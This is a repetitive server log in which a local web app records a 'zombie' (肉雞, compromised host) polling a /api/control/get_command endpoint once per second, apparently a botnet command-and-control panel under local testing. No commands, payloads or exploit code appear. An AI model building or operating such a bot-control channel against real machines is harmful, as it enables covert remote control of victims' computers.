2025-06-24 23:27:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:28:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:28:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:28:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:28:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:28:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
